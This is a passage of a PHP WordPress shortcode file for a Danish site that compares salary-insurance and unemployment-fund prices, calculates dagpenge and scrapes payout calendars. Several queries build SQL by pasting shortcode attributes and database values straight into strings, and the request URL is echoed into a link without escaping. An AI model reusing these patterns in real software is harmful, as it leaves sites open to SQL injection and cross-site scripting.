      <span class="loensikring-cta">
     <span><span class="glyphicon glyphicon-ok"></span> Find den bedste og billigste lønsikring </span>
	    <?php
        global $db;
        $get_udbydere = "SELECT * FROM loensikring_udbyder";
        $result_udbydere = $db->query($get_udbydere);
        $udbyder_count = 0;
        while ($row_udbydere = mysqli_fetch_array($result_udbydere)) {
				  $udbyder_count++;
        }
        ?>
     <span><span class="glyphicon glyphicon-ok"></span> Priser fra <?php echo $udbyder_count; ?> danske a-kasser </span>
     <span><span class="glyphicon glyphicon-ok"></span> Uafhængig tjeneste </span>
     <span><span class="glyphicon glyphicon-ok"></span> Senest opdateret <?php echo $updated; ?></span>
     </span>
 </div>
<style>
  .tooltip-inner {
	 width:300px;
  }
  .loensikring-table {
	  position:relative;
	  clear:both;padding-top:30px;
	  height:650px;
	  overflow-y:hidden;
  }
@media (max-width:768px) {
	#loensikring .tabel-center-middel {
       padding-top: 7px!important;
	   position: initial!important;
	   padding-left:0px!important;
	   padding-right:0px!important;
	}
	#loensikring .tr-oversigt {
	  position: relative!important;
	  border-bottom: 3px solid #ddd!important;
	}
	#loensikring .btn-success {
    position: absolute!important;
    left: 0!important;
    margin-top: -60px!important;
	padding-top: 8px!important;
    padding-bottom: 8px!important;
	max-width: 200px;
    margin-left: 5px;
	}
	#loensikring .course_ribbon_box {
	    width: 0px;
		height: 0px;
		position:inherit;
	}
    #loensikring .course_ribbon_box .course_ribbon_box_text {
		position: absolute;
		display: block;
		LEFT: 0px;
		padding: 7px 7px;
		font: 700 9px/1 Lato,sans-serif;
		margin-top: -30px;
    	margin-left: 5px;
		width:100px;
	}
	#loensikring .header-oversigt {
	   padding-bottom: 8px!important;
       padding-top: 8px!important;
	}
	#loensikring .hide-small {
		display:none;
	}
	#loensikring .stack-small {
		display:block!important;
		border:none!important;
		padding-bottom: 0px!important;
	}
	#loensikring .stack-high{
    padding-bottom: 80px!important;
    padding-top: 50px!important;
	}
	  .loensikring-table {
	  height:875px;
  }

}
</style>
     <div id="loader-area"></div>
   <div id="loensikring">
  <div class="table-responsive loensikring-table">
        <table class="table" id="loensikring">
<thead>
<th class="tabel-center-middel">A-kasse</th>
<th class="tabel-center-middel">Dækning</th>
<th class="tabel-center-middel hide-small">Supplerende<br/>andel</th>
<th class="tabel-center-middel"><span class="hide-small">Kvalifikation & <br/>selvrisiko</span><span class="hidden-sm hidden-md hidden-lg">Betingelser &<br/>Priser</span></th>
<th class="tabel-center-middel hide-small">Betingelser</th>
<th class="tabel-center-middel hide-small">Pris</th>
<th class="tabel-center-middel hide-small">Samlet pris</th>
<th  class="tabel-center-middel hide-small"></th>
</thead>
<tbody>
<?php
global $table_type;
$table_type = "loensikring"; // makes sure that go_udyder() takes table variable and ud urls from loensikring udbyder table is used
global $db;
$get_list = "SELECT loensikring_udbyder.*, loensikring_priser.* FROM loensikring_udbyder INNER JOIN loensikring_priser ON loensikring_udbyder.name=loensikring_priser.name WHERE salery=31000 ORDER BY loensikring_udbyder.prio ASC, loensikring_priser.price DESC";
$result_list = $db->query($get_list);

while ($row_list = mysqli_fetch_array($result_list)) {
    $name = $row_list["name"];
	$name_display = $row_list["name_display"];
    $affiliate_url = $row_list["url"];
	$base_url = $row_list["base_url"];
	$id = $row_list["id2"];
	$base_url_internal = $row_list["base_url_internal"];
    $karens = $row_list["karens"];
	$kval = $row_list["kval"];
	$required_a_kasse = $row_list["required_a_kasse"];
	$required_fag = $row_list["required_fag"];
	$udb = number_format($row_list["udb"], 0, ',', '.');
	$logo = $row_list["logo"];
	$getdagpenge = "SELECT * FROM general_stats WHERE year='current'";
		$result_list_dagpenge = $db->query($getdagpenge );
		while ($rows = mysqli_fetch_array($result_list_dagpenge)) {
			$dagpenge = number_format($rows["dagpenge_fuldtid"], 0, ',', '.');
		}
	$coverage =  number_format($row_list["coverage"], 0, ',', '.');
	$price = $row_list["price"];
	$recomended = $row_list["recomended"];
	$aktiv = $row_list["aktiv"];
		$get_list_2 = "SELECT * FROM data WHERE UDBYDER='$name'";
		$result_list_2 = $db->query($get_list_2);
		while ($row_list_2 = mysqli_fetch_array($result_list_2)) {
			$fag_pris = $row_list_2["fagforening_pris"];
			$a_kasse_pris = $row_list_2["PRIS_MDR"];
		}
	if ($aktiv != 0) {
?>
<tr <?php if($recomended>=1) {?>style="background-color:#cfeece;border-top: 2px solid #87df86;border-bottom: 2px solid #87df86;"<?php }?> class="tr-oversigt">
<td class="tabel-center-middel stack-high"><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $name_display; ?></span><a href="<?php echo $base_url_internal; ?>"><img src="<?php echo $logo; ?>" alt="<?php echo $name_display; ?> l&oslash;nsikring" data-toggle="tooltip" data-container="body" title="L&oslash;nsikring via <?php echo $name_display; ?>" style="cursor:pointer"/></a></td>
<td class="tabel-center-middel stack-high"><?php echo sprintf("%0.3f",$coverage+$dagpenge); ?> <span class="denotion"> kr.</span><span class="specs">Udbetaling/ md. <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="<?php if (empty($required_a_kasse) && empty($required_fag)){echo "Det samlede beløb før skat du vil få udbetalt.";} else { echo "Det samlede beløb før skat inkl. dagpenge (" . $dagpenge . "), som du vil få udbetalt.";} ?>" ></span></span></td>
<td class="tabel-center-middel hide-small"><?php if (empty($required_a_kasse) && empty($required_fag)){echo "-";} else echo $coverage; ?> <span class="denotion"> kr.</span><span class="specs">Dækning <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="<?php if (empty($required_a_kasse) && empty($required_fag)){echo "Dette er ikke en supplerende lønskring, og den dækker derfor det fulde beløb istedet for at supplere dagpengene";} else { echo "Det maksimale månedlige beløb forsikringen dækker udover de " . $dagpenge . " i dagpenge."; } ?>"></span></span></td>
<td class="tabel-center-middel stack-small"><?php echo $kval; ?><?php if($karens > 0 ){ echo "+" . $karens; }?><span class="denotion"> mdr.</span><span class="specs">Kvalifikation <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="Den periode du skal have haft forsikringen inden du kan gøre brug af den. <?php if($karens > 0 ){?>Derudover skal du vente <?php echo $karens; ?> måned fra du bliver ledig til lønsikringen begynder. Dette kaldes selvrisiko eller karens.<?php } else { ?>Hos <?php echo $name_display; ?> er der ingen selvrisiko/karens.<?php }?>" ></span></span></td>
<td class="tabel-center-middel stack-small">
    <span class="denotion">
    <?php if (!empty($required_a_kasse) && !empty($required_fag)){echo $required_a_kasse . " + " . $required_fag;} ?>
    <?php if (empty($required_a_kasse) && empty($required_fag)){echo "Ingen";} ?>
    <?php if (!empty($required_a_kasse) && empty($required_fag)){echo $required_a_kasse;} ?>
    <?php if (!empty($required_fag) && empty($required_a_kasse)){echo $required_fag;} ?>
    </span>
    <span class="specs">Betingelse <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="Lønsikring fra <?php echo $name_display; ?> kræver<?php if (!empty($required_a_kasse) && !empty($required_fag)){echo " medlemskab af deres " . $required_a_kasse . " + " . $required_fag;} ?><?php if (!empty($required_a_kasse) && empty($required_fag)){echo " medlemskab af deres " . $required_a_kasse;} ?><?php if (!empty($required_fag) && empty($required_a_kasse)){echo " medlemskab af deres " . $required_fag;} ?><?php if (empty($required_a_kasse) && empty($required_fag)){echo " hverken medlemskab af a-kasse eller fagforening";} ?>">
    </span>
    </span>
</td>
<td class="tabel-center-middel stack-small"><strong style="font-size:20px;"><?php echo $price; ?></strong> <span class="denotion"> kr.</span><span class="specs">Pris / md. <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="Pris for lønsikring med udbetaling i <?php echo $udb; ?> mdr. Prisen er før skattefradrag eksklusiv a-kasse og evt. fagforening" ></span></span></td>
<td class="tabel-center-middel stack-small">
    <strong style="font-size:20px;">
            <?php if (!empty($required_a_kasse) && !empty($required_fag)){echo number_format($a_kasse_pris+$fag_pris+$price, 0, ',', '.');} ?>
            <?php if (!empty($required_a_kasse) && empty($required_fag)){echo number_format($a_kasse_pris+$price, 0, ',', '.');} ?>
            <?php if (empty($required_a_kasse) && empty($required_fag)){echo number_format($price, 0, ',', '.');} ?>
    </strong>
    <span class="denotion"> kr.</span>
    <span class="specs">Pris / md. <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="Den samlede pris før skattefradrag for lønsikring (<?php echo $price; ?>)<?php if(!empty($required_a_kasse)){echo " og a-kasse" . "(" . $a_kasse_pris . ")";} if(!empty($required_fag)){echo " samt fagforening (" . $fag_pris . ")";} ?>" ></span>
    </span>
</td>
<td  class="tabel-center-middel stack-small"><span class="btn btn-block btn-primary btn-success" style="font-weight:600;" onclick="go_udbyder('<?php echo $id; ?>');"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</span><?php if($recomended>=1) {?><div class="course_ribbon_box" data-toggle="tooltip" data-container="body" title="Den a-kasse der, ifølge vores statistik, er flest der vælger lige nu."><span class="course_ribbon_box_text">Populært valg <span class="glyphicon glyphicon-star"></span></span></div> <?php }?></td>
</tr>
<?php
}
else {
?>
<tr class="tr-oversigt">
<td class="tabel-center-middel stack-high"><span class="hidden-sm hidden-xs hidden-md hidden-lg"><?php echo $name_display; ?></span><a href="<?php echo $base_url; ?>" target="_blank" title="L&oslash;nsikring hos <?php echo $name_display; ?>" ><img src="<?php echo $logo; ?>" alt="<?php echo $name_display; ?> l&oslash;nsikring" data-toggle="tooltip" data-container="body" title="L&oslash;nsikring via <?php echo $name_display; ?>"/></a></td>
<td class="tabel-center-middel stack-high"><?php echo sprintf("%0.3f",$coverage+$dagpenge); ?> <span class="denotion"> kr.</span><span class="specs">Udbetaling/ md. <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="<?php if (empty($required_a_kasse) && empty($required_fag)){echo "Det samlede beløb før skat du vil få udbetalt.";} else { echo "Det samlede beløb før skat inkl. dagpenge (" . $dagpenge . "), som du vil få udbetalt.";} ?>" ></span></span></td>
<td class="tabel-center-middel hide-small"><?php if (empty($required_a_kasse) && empty($required_fag)){echo "-";} else echo $coverage; ?> <span class="denotion"> kr.</span><span class="specs">Dækning <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="<?php if (empty($required_a_kasse) && empty($required_fag)){echo "Dette er ikke en supplerende lønskring, og den dækker derfor det fulde beløb istedet for at supplere dagpengene";} else { echo "Det maksimale månedlige beløb forsikringen dækker udover de " . $dagpenge . " i dagpenge."; } ?>"></span></span></td>
<td class="tabel-center-middel stack-small"><?php echo $kval; ?><?php if($karens > 0 ){ echo "+" . $karens; }?><span class="denotion"> mdr</span><span class="specs">Kvalifikation <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="Den periode du skal have haft forsikringen inden du kan gøre brug af den. <?php if($karens > 0 ){?>Derudover skal du vente <?php echo $karens; ?> måned fra du bliver ledig til lønsikringen begynder. Dette kaldes selvrisiko eller karens.<?php } else { ?>Hos <?php echo $name_display; ?> er der ingen selvrisiko/karens.<?php }?>" ></span></span></td>
<td class="tabel-center-middel stack-small">
    <span class="denotion">
    <?php if (!empty($required_a_kasse) && !empty($required_fag)){echo $required_a_kasse . " + " . $required_fag;} ?>
    <?php if (empty($required_a_kasse) && empty($required_fag)){echo "Ingen";} ?>
    <?php if (!empty($required_a_kasse) && empty($required_fag)){echo $required_a_kasse;} ?>
    <?php if (!empty($required_fag) && empty($required_a_kasse)){echo $required_fag;} ?>
    </span>
    <span class="specs">Betingelse <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="Lønsikring fra <?php echo $name; ?> kræver<?php if (!empty($required_a_kasse) && !empty($required_fag)){echo " medlemskab af deres " . $required_a_kasse . " + " . $required_fag;} ?><?php if (!empty($required_a_kasse) && empty($required_fag)){echo " medlemskab af deres " . $required_a_kasse;} ?><?php if (!empty($required_fag) && empty($required_a_kasse)){echo " medlemskab af deres " . $required_fag;} ?><?php if (empty($required_a_kasse) && empty($required_fag)){echo " hverken medlemskab af a-kasse eller fagforening";} ?>">
    </span>
    </span>
</td>
<td class="tabel-center-middel stack-small"><strong style="font-size:20px;"><?php echo $price; ?></strong> <span class="denotion"> kr.</span><span class="specs">Pris / md. <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="Pris for lønsikring med udbetaling i <?php echo $udb; ?> mdr. Prisen er før skattefradrag eksklusiv a-kasse og evt. fagforening" ></span></span></td>
<td class="tabel-center-middel stack-small">
    <strong style="font-size:20px;">
            <?php if (!empty($required_a_kasse) && !empty($required_fag)){echo number_format($a_kasse_pris+$fag_pris+$price, 0, ',', '.');} ?>
            <?php if (!empty($required_a_kasse) && empty($required_fag)){echo number_format($a_kasse_pris+$price, 0, ',', '.');} ?>
            <?php if (empty($required_a_kasse) && empty($required_fag)){echo number_format($price, 0, ',', '.');} ?>
    </strong>
    <span class="denotion"> kr.</span>
    <span class="specs">Pris / md. <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="Den samlede pris før skattefradrag for lønsikring (<?php echo $price; ?>)<?php if(!empty($required_a_kasse)){echo " og a-kasse" . "(" . $a_kasse_pris . ")";} if(!empty($required_fag)){echo " samt fagforening (" . $fag_pris . ")";} ?>" ></span>
    </span>
</td>
<td  class="tabel-center-middel stack-small"><?php if(!empty($base_url_internal)) { ?><a href="<?php echo $base_url_internal; ?>" class="btn btn-block btn-primary btn-success" style="font-weight:600;"><span class="glyphicon glyphicon-circle-arrow-right"></span> LÆS MERE</a><?php } ?></td>
</tr>
<?php
	}
}
?>
</tbody>
<span id="full_table"><span style="margin-top:40px;display:block;">Se flere resultater <span class="glyphicon glyphicon-chevron-down" ></span></span></span>
</table>
</div>
<h2>Lønsikring priser i Danmark | Et sorteret overblik</h2>
<p>Med ovenstående tabel får du det samlede overblik, hvis du ønsker en samlet pris for både lønskring, a-kasse og eventuelt fagforening. Det kan dog være, at du udelukkende er ude efter at se lønsikring priser udafhængigt af andre priser, og derfor har vi lavet nedenstående overblik, hvor lønsikring priserne er sorteret fra billigst til dyrest.</p>
<p>Priserne er fundet på baggrund af en grundløn på 31.000 før skat med fuldtidsforsikring.</p>
<ul>
<?php
$get_list_price_order = "SELECT loensikring_udbyder.*, loensikring_priser.* FROM loensikring_udbyder INNER JOIN loensikring_priser ON loensikring_udbyder.name=loensikring_priser.name WHERE salery=31000 ORDER BY loensikring_priser.price ASC";
$result_list = $db->query($get_list_price_order);
while ($row_list = mysqli_fetch_array($result_list)) {
    $name = $row_list["name"];
	$name_display = $row_list["name_display"];
	$price = $row_list["price"];
?>
  <li><?php echo $name_display; ?> | <?php echo $price; ?> DKK / md.</li>
<?php
}
?>
</ul>
</div>
</div>
</div>
</div>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'loensikring', 'loensikring' );
}


function billigste_loensikring($db) {
 ob_start();
 ?>
<ul>
<?php
$get_list_price_order = "SELECT loensikring_udbyder.*, loensikring_priser.* FROM loensikring_udbyder INNER JOIN loensikring_priser ON loensikring_udbyder.name=loensikring_priser.name WHERE salery=31000 ORDER BY loensikring_priser.price ASC";
$result_list = $db->query($get_list_price_order);
$x = 0;
while ($row_list = mysqli_fetch_array($result_list)) {
    $name = $row_list["name"];
	$name_display = $row_list["name_display"];
	$price = $row_list["price"];
	$id = $row_list["ID"];
?>
  <li><?php echo $name_display; ?> - <?php echo $price; ?> DKK / md.</li>
<?php
if ($x == 0) {
  $billigste_name = $name_display;
  $billigste_pris = $price;
}
$x++;
}
?>
</ul>
<p>I henhold til listen ovenfor kan det konkluderes at den billigste lønsikring lige nu tilbydes af <?php echo $billigste_name ?>, med en pris på kun <?php echo $billigste_pris ?> kr./md.</p>
<?php
global $db;
$get_updated = "SELECT LAST_UPDATED FROM data ORDER BY LAST_UPDATED DESC LIMIT 1";
$result_updated = $db->query($get_updated);

while ($row_updated = mysqli_fetch_array($result_updated)) {

	   $updated = date('d.m.Y', strtotime($row_updated["LAST_UPDATED"]));
}
?>
<p>Data i listen blev senest opdateret: <?php echo $updated; ?></p>
<?php
return ob_get_clean();
	 }
	 global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'billigste_loensikring', 'billigste_loensikring' );
}





function dagpenge_udbetaling($atts) {
 ob_start();
  $a = shortcode_atts( array(
        "valgt_akasse" => "",
		"no_pre_select" => "false",
    ), $atts );
	global $valgt_akasse;
	$valgt_akasse = $a['valgt_akasse'];
	$no_pre_select = $a['no_pre_select'];
 global $db;
 $get_list_valgt = "SELECT * FROM data WHERE UDBYDER='$valgt_akasse'";
 $result_list_valgt = $db->query($get_list_valgt);
 while ($row_list_valgt = mysqli_fetch_array($result_list_valgt)) {
	$dagpenge_url = $row_list_valgt["dagpenge_url"];
 }
 ?>
 <script>
$(document).ready(function() {
	$("#cta-anker").click(function() {
		getdata($("#variabel" ).val(), "" ,"dagpenge_udbetaling");
         $('#loader-area-dagpenge_udbetaling').html('<div class="getting-data" id="getting-data"><strong>Henter data...</strong><br/><div class="loader"></div></div>');
		setTimeout(function() {
			$('#getting-data').fadeOut('slow');
		}, 1000); // <-- time in milliseconds
       $('html, body').animate({
       		scrollTop: jQuery("#loader-area-dagpenge_udbetaling").offset().top -200
       }, 1000);
	});
     $('[data-toggle="tooltip"]').tooltip();
})
</script>
 <form class="form-inline" action="#" style="margin-bottom: 20px;">
    <div class="form-group" style="width:100%;">
      <select class="form-control input-md" style="width: 100%;border-radius: 0px;" name="variabel" id="variabel">
      <?php if($no_pre_select == "true") { ?>
      <option value="" selected="" disabled="">Vælg din a-kasse</option>
      <?php } ?>
        <?php
        $get_list = "SELECT * FROM data WHERE PRIS_MDR > 0 ORDER BY UDBYDER ASC";
        $result_list = $db->query($get_list);
        while ($row_list = mysqli_fetch_array($result_list)) {$udbyder = $row_list["UDBYDER"];
			$udbyder_display = $row_list["udbyder_display"];
        ?>
      <option value="<?php echo $row_list["UDBYDER"]; ?>" <?php if($udbyder == $valgt_akasse) { echo "selected";} ?>><?php echo $udbyder_display; ?></option>
      <?php
       }
     ?>
      </select>
    </div>
    <button type="button" class="btn btn-success input-lg full-width-cta-btn" id="cta-anker">VIS UDBETALINGSKALENDER</button>
  </form>
<style>
.dagpenge_head tr:first-child td {
	font-weight:600;
}
</style>
<div id="loader-area-dagpenge_udbetaling"></div><div class="table-responsive" id="dagpenge_udbetaling">
<?php
    if($no_pre_select != "true") {
   require $_SERVER['DOCUMENT_ROOT'] . '/includes/simple_html_dom.php';
$html = file_get_html($dagpenge_url);

		if (empty($html->find('table'))) {
             echo "<p><strong>Vi kunne desværre ikke finde en udbetalingskalender på " . $akasse . "´s hjemmeside</strong></p>";
		}

foreach($html->find('table') as $table) {

				    if (strpos($table, 'November') !== false || strpos($table, 'november') !== false || strpos($table, 'nov') !== false || strpos($table, 'nov.') !== false || strpos($table, 'nov.') !== false || strpos($table, 'Nov.') !== false || strpos($table, 'frist') !== false || strpos($table, 'Periode') !== false) {
							foreach($table->find('tr') as $row) {
							// initialize array to store the cell data from each row
							$flight = array();
							foreach($row->find('td') as $cell) {
								// push the cell's text to the array
								$flight[] = $cell->plaintext;
							}
							foreach($row->find('th') as $cell) {
								// push the cell's text to the array
								$flight[] = $cell->plaintext;
							}
							$rowData[] = $flight;
						}
						echo '<table class="table dagpenge_head">';
						foreach ($rowData as $row => $tr) {
							echo '<tr>';
							foreach ($tr as $td)
								echo '<td>' . $td .'</td>';
							echo '</tr>';
						}
						echo '</table>';
				} else {

					echo "<p><strong>Vi kunne desværre ikke finde en udbetalingskalender på " . $akasse . "´s hjemmeside</strong></p>";

				}

}
	}
    ?>
    </div>
<?php
return ob_get_clean();
	 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'dagpenge_udbetaling', 'dagpenge_udbetaling' );
}


function dagpengeberegner($db) {
 ob_start();
 ?>
  <script>
$(document).ready(function() {
	     $("#dagpenge-beregn").click(function() {
		 getdata($("#pay" ).val(), $("#type" ).val(),"dagpengeberegner");
         $('#loader-area-dagpengeberegner').html('<div class="getting-data" id="getting-data"><strong>Henter data...</strong><br/><div class="loader"></div></div>');
	});
     $('[data-toggle="tooltip"]').tooltip();
		  $("#type").change(function () {
		  var selected_option = $('#type').val();
		  if (selected_option === 'dagpenge_fuldtid'  || selected_option === 'dagpenge_deltid' ) {
			$( "#no_pay_field" ).hide();
			$( "#pay_field" ).show();
		  }
		  if (selected_option === 'dagpenge_fuldtid_dim_for'  || selected_option === 'dagpenge_fuldtid_dim_ikke_for' || selected_option === 'dagpenge_deltid_dim_for' || selected_option === 'dagpenge_deltid_dim_ikke_for') {
			$( "#pay_field" ).hide();
			$( "#no_pay_field" ).show();
		  }
		})
})
</script>
 <form class="form-inline" action="#" style="margin-bottom:20px;max-width:500px">
    <div class="form-group" style="width:100%;">
      <label>Forsikringstype</label>
      <select class="form-control input-md" style="width: 100%;border-radius:0px;margin-bottom:10px" name="type" id="type">
        <option value="" selected="" disabled="">Vælg forsikringstype</option>
        <option value="dagpenge_fuldtid">Fuldtid</option>
        <option value="dagpenge_deltid">Deltid</option>
        <option value="dagpenge_fuldtid_dim_for">Dimittend fuldtid forsørger</option>
        <option value="dagpenge_fuldtid_dim_ikke_for">Dimittend fuldtid ikke forsørger</option>
        <option value="dagpenge_deltid_dim_for">Dimittend deltid forsørger</option>
        <option value="dagpenge_deltid_dim_ikke_for">Dimittend deltid ikke forsørger</option>
      </select>
      <div id="pay_field" style="display:none">
      <label>Gennemsnitlig bruttoløn pr. måned <span class="glyphicon glyphicon-info-sign" style="color:#555;cursor:pointer;" data-toggle="tooltip" data-container="body" title="" data-original-title="Indtast din gennemsnitlige bruttol&#248;n (inkl. 8 pct. arbejdsmarkedsbidrag) i de 12 m&#229;neder inden for de sidste 24 m&#229;neder, hvor du har tjent mest. Har du ikke modtaget l&#248;n i 12 m&#229;neder, s&#229; angiv den gennemsnitlige bruttol&#248;n i de m&#229;neder, hvor du har modtaget l&#248;n. Du m&#229; kun medtage l&#248;n for perioder, hvor du har v&#230;ret medlem af en a-kasse."></span></label>
      <input type="text" pattern="[0-9]" class="form-control input-md" style="width: 100%;border-radius: 0px;" name="pay" id="pay"/>
    </div>
    </div>
    <div id="no_pay_field" style="display:none">
    <p><strong>Som dimittend får du en fast dagpengesats</strong></p>
    </div>
    <button type="button" class="btn btn-success input-lg full-width-cta-btn" id="dagpenge-beregn">BEREGN DAGPENGE</button>
  </form>

<div class="table-responsive" id="dagpengeberegner"></div>
<?php
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'dagpengeberegner', 'dagpengeberegner' );
}



function dagpenge_tax_calc_example() {
 ob_start();
 ?>
<?php
global $db;
$get_list = "SELECT dagpenge_fuldtid FROM general_stats WHERE year = 'current'";
$result_list = $db->query($get_list);
while ($row_list = mysqli_fetch_array($result_list)) {
	$dagpenge_fuldtid = number_format($row_list['dagpenge_fuldtid'],0,',','.'); ?>

   <p>Hvis vi tager udgangspunkt i, at du betaler ca. 38% i skat og har 50.000 i fradrag om året (meget normalt for de fleste), vil en udregning af, hvad du får udbetalt efter skat med <?php echo date("Y"); ?>-dagpengesatsen se således ud:</p>
<ul>
<li>Månedligt fradrag = 50.000/12 = 4.166 kroner</li>
<li>Skattepligtigt beløb = <?php echo $dagpenge_fuldtid; ?> - 4.166 = <?php  (float)$tax_amount = (float)$dagpenge_fuldtid-(float)4.166; echo number_format($tax_amount,3); ?> kroner</li>
<li>Skat = <?php  echo number_format($tax_amount,3); ?> * 0,38 = <?php  echo number_format($tax_amount*0.38,3); ?> kroner</li>
<li><strong>Udbetalt efter skat =</strong> <?php echo $dagpenge_fuldtid; ?> - <?php  echo number_format($tax_amount*0.38,3); ?> = <?php $payout = (float)$dagpenge_fuldtid-number_format($tax_amount,3)*0.38; echo number_format($payout,3); ?> kroner</li>
</ul>
<p>I eksemplet får du altså <?php $payout = (float)$dagpenge_fuldtid- number_format($tax_amount,3)*0.38; echo number_format($payout,3); ?> kroner udbetalt af dine dagpenge, når skatten og fradrag er trukket fra.</p>
<p>Du kan selv prøve at erstatte skatteprocenten og fragdraget med dine egne tal.</p>

<?php
}
return ob_get_clean();
 }
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'dagpenge_tax_calc_example', 'dagpenge_tax_calc_example' );
}
?>

<?php
function feedbackwp($atts) {
ob_start();
    $a = shortcode_atts( array(
        "rate" => "",
		"count" => "",
		"itemReviewed" => "",
		"brand" => "",
		"img" => "",
		"description" => "description",
    ), $atts );
	global $rate;
	global $count;
	global $itemReviewed;
	global $brand;
	global $img;
	global $description;
	$rate = $a['rate'];
	$count = $a['count'];
	$itemReviewed = $a['itemReviewed'];
	$brand = $a['brand'];
	$img = $a['img'];
	$description = $a['description'];
	$url = (isset($_SERVER['HTTPS']) ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
?>
<div class="feedback-wrap">
  <div class="feedback-heading">Giv din bedømmmelse</div>

<?php if ($rate != "") { ?>
<div class="feedback-rating">
<strong>Brugerbedømmelse: </strong>: <span itemprop="ratingValue"><?php echo $rate; ?></span>/<span itemprop="bestRating">5</span> <em>baseret på <span itemprop="ratingCount"><?php echo $count; ?></span> anmeldelser</em> <span itemprop="worstRating" class="hide">1</span></div>
<script type="application/ld+json">
{
        "@context": "http://schema.org",
        "@type": "Product",
        "name": "<?php echo $itemReviewed; ?>",
		<?php if(!empty($brand)) { ?> "brand": "<?php echo $brand; ?>", <?php } ?>
		<?php if(!empty($description)) { ?> "description": "<?php echo $description; ?>", <?php } ?>
		<?php if(!empty($img)) { ?> "image": "<?php echo $img; ?>", <?php } ?>
        "aggregateRating": {
          "@type": "AggregateRating",
          "ratingValue": "<?php echo $rate; ?>",
          "ratingCount": "<?php echo $count; ?>"
         }
}
</script>

<?php } else { ?>

<div class="feedback-rating">Denne artikel har endnu ikke modtaget feedback...</div>

<?php } ?>

<a href="/feedback.php?url=<?php echo $url; ?>" class="btn btn-block btn-primary btn-warning feedback-button" rel="nofollow" target="_blank" title="Giv feedback">GIV FEEDBACK</a>

</div>
<?php
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'feedbackwp', 'feedbackwp' );
}


function news($atts) {
	$a = shortcode_atts( array(
        "exclude_cats" => "",
		"only_cats" => "",
		"num_posts" => "",
    ), $atts );
	global $exclude_cats;
	global $only_cats;
	global $num_posts;
	$exclude_cats = $a['exclude_cats'];
	$only_cats = $a['only_cats'];
	$num_posts = $a['num_posts'];
ob_start();
if(!empty($exclude_cats)){
	$cat = '&cat=' . $exclude_cats;
} elseif(!empty($only_cats)){
	$cat = '&cat=' . $only_cats;
} else {
	$cat = '';
}
query_posts('showposts=' . $num_posts . $cat);
while (have_posts()): the_post();
$description_meta = get_post_meta(get_the_ID(), '_yoast_wpseo_metadesc', true);
?>
<div class="newsroll">
<a class="widget-link" href="<?php  the_permalink(); ?>"><h3><?php the_title(); ?></h3></a>
<p><?php if(!empty($description_meta)){echo $description_meta;} else {echo the_excerpt();} ?>... <a href="<?php  the_permalink(); ?>">Læs nyhed</a></p>
<span style="font-size:14px;margin-bottom:5px;"><?php echo get_the_modified_date('Y-m-d'); ?></span>
</div>
<?php  endwhile; ?>
<hr style="clear:both"/>
<?php
return ob_get_clean();
}
global $wp_query;
if (isset($wp_query->post->ID) ) {
add_shortcode( 'news', 'news' );
}

function custom4($atts) {
  $a = shortcode_atts( array(
        "keyword" => "",
		     "prio" => "",
         "akasse1" => "",
         "akasse2" => "",
         "akasse3" => "",
    ), $atts );
	global $eng;
	$keyword = $a['keyword'];
	$prio = $a['prio'];
  $akasse1 = $a['akasse1'];
  $akasse2 = $a['akasse2'];
  $akasse3 = $a['akasse3'];
 ob_start();
 ?>
 <script>
      $(document).ready(function() {
		 $('[data-toggle="tooltip"]').tooltip();

      })
</script>
<style>

 .wrapper-custom4 {
	box-shadow: 0px 3px 6px #155cce29;
    margin: 15px 0px;
    background-color: #FFFFFF;
    border-top: 2px solid #f4f4f4;
    padding:15px;
    align-items: center;
    min-height: 156px;
    color: black;
	cursor:pointer;
  }
  .wrapper-custom4:hover {
	border-top: 1px solid #9bbdf2c7;
	box-shadow: 0px 3px 6px #155ccec7;
   }
	.logo-custom4 {
		width: 20%;
		float: left;
		padding: 40px;
	}
	.info {
    width: 80%;
    float: left;
	}
	.akasse_price {
   width: 20%;
    float: left;
    padding: 14px;
    text-align: center;
    font-size: 20px !important;
	}
		.fag_price {
width: 20%;
    float: left;
        padding: 14px;
    text-align: center;
    font-size: 20px !important;
	}
		.checkmarks {
		width:35%;
		float:left;
		 font-weight:600;
		 font-size: 14px;
         margin-top: 10px;
	}
		.cta {
		width:25%;
		float:left;
		margin-top: 10px;
	}
	.description {
		width:100%;
		font-size:14px;
		float:right;
		padding: 10px 0px 0px 15px;
	}
	.checkmarks .glyphicon-ok {
		color:#337ab7;
	}
	.checkmarks p {
		margin-bottom:2px;
	}
	.wrapper-custom4 .specs {
    font-size: 12px;
    }
 @media (max-width:1200px) {
  .wrapper-custom4 {
    min-height: 200px;
  }
  .logo-custom4 {
    width: 25%;
    padding: 40px 0px;
	text-align: center;
	}
	.info {
		width: 75%;
	}
	.akasse_price {
    width: 50%;
    padding: 12px;
